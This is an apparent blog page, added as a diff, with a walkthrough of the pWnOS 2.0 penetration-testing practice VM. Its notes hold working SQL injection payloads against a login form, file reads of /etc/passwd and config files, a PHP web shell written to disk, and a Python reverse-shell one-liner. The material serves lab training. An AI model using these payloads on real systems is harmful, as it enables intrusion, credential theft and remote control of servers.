@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>pWnOS 2.0 (Manual SQLi)</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="../../css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="../../css/one-page-wonder.css" rel="stylesheet">
+
+    <!-- HandDrawn Button CSS -->
+    <!-- <link rel="stylesheet" href="css/button/normalize.css"> -->
+    <link rel="stylesheet" href="../../css/button/style.css">
+    <link rel="stylesheet" href="../../cheat-assets/plugins/prism/prism.css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+        <div class="container">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="../../index.html">UB3RSEC</a>
+            </div>
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="../main-page.html">Main</a>
+                    </li>
+                    <!-- <li>
+                        <a href="services.html">Services</a>
+                    </li> -->
+                    <li>
+                        <a href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+
+    <!-- Page Content -->
+    <div class="container">
+
+
+        <!-- First Featurette -->
+        <div class="featurette">
+            <!-- <img class="featurette-image img-circle img-responsive pull-right" src="http://placehold.it/500x500">  -->
+            <h2 class="featurette-heading">pWnOS 2.0
+                <!-- <span class="text-muted">Will Catch Your Eye</span> -->
+            </h2>
+            <p class="lead">
+                <h3> Goal:</h3>
+                <p>Get root... Win!</p>
+    
+                <h3>About:</h3>
+
+                <p>pWnOS v2.0 is a Virutal Machine Image which hosts a server to pratice penetration testing. It will test your ability to exploit the server and contains multiple entry points to reach the goal (root). It was design to be used with WMWare Workstation 7.0, but can also be used with most other virtual machine software.</p> 
+                <h3>Configuration & Setup:</h3>
+
+                <p>Configure your attacking platform to be within the 10.10.10.0/24 network range</p>
+                <p>The server's ip is staticaly set to 10.10.10.100<br>Server's Network Settings:<br>
+
+                IP: 10.10.10.100<br>
+                Netmask: 255.255.255.0<br>
+                Gateway: 10.10.10.15</p>
+            </p>
+
+            <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">pWnOS 2.0 VM Download</a><br>
+
+            <h2 class="title text-center">Walkthrough Video</h2><br>
+            <div align="center">
+                <video width="800" height="480" controls>
+                    <source src="../../videos/2016/pwnosv2-sqli.mp4" type="video/mp4">
+                    <!-- <source src="movie.ogg" type="video/ogg"> -->
+                    <!-- Your browser does not support the video tag. -->
+                </video>
+            </div>
+            <div class="block">
+                <h3 class="sub-title text-center">Notes</h3>
+                <div class="code-block">
+                    <pre><code class="language-markup">
+//intercept post request using burpsuite
+//alter post data
+
+email='&pass=pass&submit=Login&submitted=TRUE
+
+email=' order by 1-- -&pass=pass&submit=Login&submitted=TRUE
+email=' order by 9-- -&pass=pass&submit=Login&submitted=TRUE
+//MySQL Error: Unknown column '9' in 'order clause
+
+email=' union select 1,2,3,4,5,6,7,8-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select 1,2,3,@@version,5,6,7,8-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select 1,2,3,user(),5,6,7,8-- -&pass=pass&submit=Login&submitted=TRUE
+
+email=' union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_name='users'-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select 1,2,3,group_concat(user_id,0x3a,email,0x3a,pass,0x3a,user_level,0x3a),5,6,7,8 from users-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a,pass,0x3a,user_level,0x3a),5,6,7,8 from users-- -&pass=pass&submit=Login&submitted=TRUE
+
+email=' union select null,null,null,load_file('/etc/passwd'),null,null,null,null-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select null,null,null,load_file('/var/www/login.php'),null,null,null,null-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select null,null,null,load_file('/var/www/includes/config.inc.php'),null,null,null,null-- -&pass=pass&submit=Login&submitted=TRUE
+email=' union select null,null,null,load_file('/var/www/mysqli_connect.php'),null,null,null,null-- -&pass=pass&submit=Login&submitted=TRUE
+//mysql -->user passwd: root goodday
+
+//write php shell onto disk
+email=' union select null,null,null,"<?php system($_GET['cmd']);?>",null,null,null,null into outfile '/var/www/shell.php'-- -&pass=pass&submit=Login&submitted=TRUE
+
+//confirm shell is written to webserver root
+email=' union select null,null,null,load_file('/var/www/shell.php'),null,null,null,null-- -&pass=pass&submit=Login&submitted=TRUE
+
+//shell can be accessed at http://10.10.10.100/shell.php?cmd=[command]
+http://10.10.10.100/shell.php?cmd=id
+http://10.10.10.100/shell.php?cmd=uname -a
+http://10.10.10.100/shell.php?cmd=which python
+
+//python reverse shell one liner
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.50",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+//privilege escalation
+/var/mysqli_connect.php has root password
+ssh using this password
+
+                    </code></pre>
+                </div><!--//code-block-->
+            </div><!--//block-->
+        </div>
+
+        <!-- Footer -->
+        <footer>
+            <div class="row">
+                <div class="col-lg-12">
+                    <p>Copyright &copy; UB3RSiCK 2016</p>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+    <!-- /.container -->
+
+
+
+
+    <!-- jQuery -->
+    <script src="../../js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="../../js/bootstrap.min.js"></script>
+
+    <script type="text/javascript" src="../../cheat-assets/plugins/prism/prism.js"></script>
+</body>
+
+</html>
